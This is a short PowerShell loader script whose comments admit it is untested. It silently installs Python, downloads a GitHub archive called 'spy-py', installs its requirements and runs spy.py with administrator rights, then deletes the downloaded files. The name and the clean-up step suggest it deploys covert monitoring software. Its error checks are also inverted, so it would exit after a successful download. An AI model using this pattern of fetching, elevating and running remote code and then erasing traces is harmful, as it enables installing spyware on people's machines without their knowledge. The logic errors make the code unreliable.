# I have no clue if this works
# Will test later
# In theory it should work

if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
    Write-Host "Python is not installed. Installing..."
    $pythonInstallerUrl = "https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe"
    $pythonInstallerPath = Join-Path $env:TEMP "python_installer.exe"
    Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile $pythonInstallerPath
    Start-Process -FilePath $pythonInstallerPath -ArgumentList "/quiet", "InstallAllUsers=1", "PrependPath=1" -Wait
    if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
        Write-Host "Failed to install Python. Exiting..."
        exit 1
    }
}

$repoUrl = "https://github.com/mohamed-khettab/spy-py/archive/main.zip"
$downloadPath = Join-Path $env:TEMP "spy-py-main.zip"
Invoke-WebRequest -Uri $repoUrl -OutFile $downloadPath
if ($?) {
    Write-Host "Failed to download repository. Exiting..."
    exit 1
}

$randomFolder = Join-Path $env:TEMP ("repo_" + [System.IO.Path]::GetRandomFileName())
Write-Host "Extracting repository to $randomFolder..."
Expand-Archive -Path $downloadPath -DestinationPath $randomFolder
if ($?) {
    Write-Host "Failed to extract repository. Exiting..."
    exit 1
}

Write-Host "Installing requirements..."
pip install -r "$randomFolder\spy-py-main\requirements.txt"
if ($?) {
    Write-Host "Failed to install requirements. Exiting..."
    exit 1
}

Write-Host "Running main.py as administrator..."
Start-Process python -ArgumentList "$randomFolder\spy-py-main\spy-py\spy.py" -Verb RunAs
if ($?) {
    Write-Host "Failed to run spy.py. Exiting..."
    exit 1
}

Write-Host "Cleaning up..."
Remove-Item $downloadPath -Force
Remove-Item $randomFolder -Recurse -Force

Write-Host "Script completed successfully."
exit 0
